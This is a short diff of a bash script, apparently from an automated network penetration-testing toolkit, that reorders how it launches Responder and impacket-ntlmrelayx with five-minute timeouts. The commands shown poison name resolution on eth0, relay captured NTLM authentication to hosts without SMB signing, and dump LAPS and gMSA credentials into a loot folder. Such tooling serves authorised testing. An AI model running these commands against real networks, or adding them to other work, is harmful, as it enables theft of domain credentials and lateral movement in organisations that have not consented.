@@ -58,12 +58,12 @@ else
 fi
 
 #Responder with 300sec timeout in bg
-echo '! > Starting Responder && impacket-ntlmrelayx'
-timeout 300 responder -I eth0 -dwvFP >> /root/output/responder.txt &
+echo '! > Starting impacket-ntlmrelayx && Responder'
 timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt -smb2support -tf /root/output/list/smb_sign_off.txt >> /root/output/relay.txt &
+timeout 300 responder -I eth0 -dwvFP >> /root/output/responder.txt &
 
-PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
 PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
+PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
 
 wait $PID_RESPONDER
 wait $PID_RELAY
